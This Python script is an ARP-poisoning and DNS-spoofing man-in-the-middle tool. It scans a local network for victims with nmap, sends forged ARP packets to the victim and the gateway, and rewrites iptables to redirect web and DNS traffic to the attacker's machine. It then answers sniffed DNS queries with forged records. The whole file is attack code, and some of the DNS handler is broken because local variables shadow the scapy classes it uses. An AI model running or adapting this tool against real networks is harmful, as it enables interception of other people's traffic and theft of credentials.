#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import threading
import nmap
import NetworkManager
from scapy.all import *


class ARPPoisoning(threading.Thread):
    """
    Thread to start the ARP packet crafting and sending process.
    """

    def __init__(self, srcAddress, dstAddress, IFc):
        """
            Receive the source and destination address for the ARP packet.
        """
        threading.Thread.__init__(self)
        self.srcAddress = srcAddress
        self.dstAddress = dstAddress
        self.IFc = IFc

    def run(self):
        """
            Every thread sends an ARP packet to the destination every second.
        """
        try:
            arpPacket = ARP(pdst=self.dstAddress, psrc=self.srcAddress)
            send(arpPacket, verbose=False, loop=1, iface=str(self.IFc))
        except:
            print "***************************************"
            print "Unexpected error:", sys.exc_info()[0]


class DNSSpoofing(object):
    """
        This class will start the DNS Spoofing attack.
    """
    def __init__(self, interface, mitm, gateway):
        """
            Setup the values for the attack.
        """
        self.mitm = mitm
        self.interface = interface
        self.capFilter = "udp port 53"
        self.gateway = gateway
        self.verbose = False

    def enableForwarding(self):
        """
            The attacker machine needs to forward the packets between gateway and victim.
        """
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def redirectionRules(self):
        """
            IPTables rules to redirect the traffic to the specified destination.
            This is important to filter the DNS packets emitted by the gateway.
        """
        #os.system("echo 0 > /proc/sys/net/ipv4/conf/" + self.interface + "/send_redirects")

        os.system("iptables --flush")
        os.system("iptables --zero")
        os.system("iptables --delete-chain")
        os.system("iptables -F -t nat")
        os.system("iptables --append FORWARD --in-interface " + self.interface + " --jump ACCEPT")
        os.system("iptables --table nat --append POSTROUTING --out-interface " + self.interface + " --jump MASQUERADE")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination " + self.mitm)
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination " + self.mitm)
        os.system("iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d " + self.gateway + " --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
        os.system("iptables -A OUTPUT -p udp -s " + self.gateway + " --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP")
        os.system("iptables -A INPUT -p udp -s 0/0 --sport 53 -d " + self.gateway + " --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
        os.system("iptables -A OUTPUT -p udp -s " + self.gateway + " --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP")

        os.system("iptables -t nat -A PREROUTING -i " + self.interface + " -p udp --dport 53 -j DNAT --to " + self.mitm)
        os.system("iptables -t nat -A PREROUTING -i " + self.interface + " -p tcp --dport 53 -j DNAT --to " + self.mitm)

    def cleanRules(self):
        """
            Clean the IPTables rules.
        """
        os.system("iptables --flush")

    def disableForwarding(self):
        """
            Disable the packet forwarding in this machine.
        """
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def ShowOrPoisoning(self, packet):
        DNS = None
        IP = None
        UDP = None
        DNSQR = None
        DNSRR = None
        ipAddressTarget = self.mitm # Local machine that work like mitm
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            try:
                requestIP = packet[IP]
                requestUDP = packet[UDP]
                requestDNS = packet[DNS]
                requestDNSQR = packet[DNSQR]
                if self.verbose:
                    print '[+] Target Domain %s searched... ' % packet.getlayer(DNS).qd.qname
                    print '[+] Crafting the DNS Packet with tht following settings: '
                    print '[+] IP Source: %s ' % requestIP.dst
                    print '[+] IP Dest: %s ' % requestIP.src
                    print '[+] Port Source: %s ' % requestUDP.dport
                    print '[+] Port Dest: %s ' % requestUDP.sport
                    print '[+] RRName: %s ' % packet.getlayer(DNS).qd.qname
                    print '[+] RData: %s ' % ipAddressTarget
                    print '[+] DNS Packet ID: %s ' % requestDNS.id

                responseIP = IP(src=requestIP.dst, dst=requestIP.src)
                responseUDP = UDP(sport=requestUDP.dport, dport=requestUDP.sport)
                responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata=ipAddressTarget)
                responseDNS = DNS(qr=1, id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
                answer = responseIP/responseUDP/responseDNS
                send(answer)
            except:
                print "Unexpected error:", sys.exc_info()[0]
                print "Exception..."
        else:
            print packet.summary()

    def startAttack(self, verbose):
        """
            Start the attack with the domains specified by command-line
        """
        self.verbose = verbose
        try:
            self.cleanRules()
            self.enableForwarding()
            self.redirectionRules()
            sniff(iface=str(self.interface), filter=self.capFilter, prn=self.ShowOrPoisoning)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print e
            print "error..."
            self.disableForwarding()
            self.cleanRules()


class VenomClass(object):
    def __init__(self, device, gateway, host, victim):
        self.device = device
        self.host_ip = host
        self.gateway_ip = gateway
        self.victim_ip = victim

    def __del__(self):
        pass

    def do_venom(self):
        print "Venom....... IP: %s" % self.victim_ip
        print "MiTM:\t%s" % self.host_ip
        print "Victim:\t%s" % self.victim_ip
        print "GateWay:%s" % self.gateway_ip
        print "Iface:\t%s" % self.device
        # vt = ARPPoisoning(self.gateway_ip, self.victim_ip, self.device)
        # gw = ARPPoisoning(self.victim_ip, self.gateway_ip, self.device)
        vt = ARPPoisoning('192.168.0.1', '192.168.0.90', 'eth0')
        gw = ARPPoisoning('192.168.0.90', '192.168.0.1', 'eth0')
        vt.setDaemon(True)
        gw.setDaemon(True)
        vt.start()
        gw.start()
        # dnsSpoof = DNSSpoofing(self.device, self.gateway_ip, self.host_ip)
        dnsSpoof = DNSSpoofing('eth0', '192.168.0.1', '192.168.0.75')
        dnsSpoof.startAttack(False)


def HostVictims(nt, gw, mIP):
    hostlist = []
    nm = nmap.PortScanner()
    h = nm.scan(hosts=nt, arguments='-n -sP -PE')
    print "\n-- Host on the Net:"
    for host in nm.all_hosts():
        if host != gw and host != mIP:
            mac = h['scan'][host]['addresses'].items()[0][1]
            ipv4 = h['scan'][host]['addresses'].items()[1][1]
            vendor = h['scan'][host]['vendor'].items()[0][1]
            print "\tIP: %s - mac: %s - vendor: %s" % (ipv4, mac, vendor)
            hostlist.append(ipv4)
    print "\n"
    print "****************************************************************************"
    return hostlist


def StatusNets():
    c = NetworkManager.const
    netdicc = {}

    for conn in NetworkManager.NetworkManager.ActiveConnections:
        for dev in conn.Devices:
            templist = []
            print("Device: %s" % dev.Interface)
            print("   Type             %s" % c('device_type', dev.DeviceType))
            devicedetail = dev.SpecificDevice()
            if not callable(devicedetail.HwAddress):
                print("   MAC address      %s" % devicedetail.HwAddress)
            print("   IPv4 config")
            print("      Addresses")
            for addr in dev.Ip4Config.Addresses:
                print("         %s/%d -> %s" % tuple(addr))
                l = str(addr[2]).split('.')
                net = l[0] + '.' + l[1] + '.' + l[2] + '.0/' + str(addr[1])
            print("      Routes")
            print("      Name servers")
            for ns in dev.Ip4Config.Nameservers:
                print("         %s" % ns)
            hostlist = HostVictims(net, str(addr[2]), str(addr[0]))
            templist.append(addr[2]) # gateway
            templist.append(addr[0]) # myIP
            templist.append(hostlist)
            netdicc[dev.Interface] = templist
    return netdicc


if __name__ == '__main__':
    # dicc = StatusNets()
    # lst_vict = []
    # print 'End of Scan'
    # print '\nVictims:'
    # i = 1
    # for c, v in dicc.iteritems():
    #     for vict_ip in dicc[c][2]:
    #         lst = []
    #         lst.append(c)
    #         lst.append(dicc[c][0])
    #         lst.append(dicc[c][1])
    #         lst.append(vict_ip)
    #         print "{}.- IP: {} - Device: {}".format(str(i), lst[3], lst[0])
    #         i += 1
    #         lst_vict.append(lst)

    try:
        # victim = raw_input('Select the victim: ')
        # l = lst_vict[int(victim) - 1]
        # # l = [u'wlan0', '192.168.1.1', '192.168.1.38', '192.168.1.39']
        # print 'Venom...'
        # vip = VenomClass(str(l[0]), str(l[1]), str(l[2]), str(l[3]))
        vip = VenomClass('eth0', '192.168.0.1', '192.168.0.75', '192.168.0.90')
        vip.do_venom()
        del vip
    except KeyboardInterrupt:
        sys.exit(0)
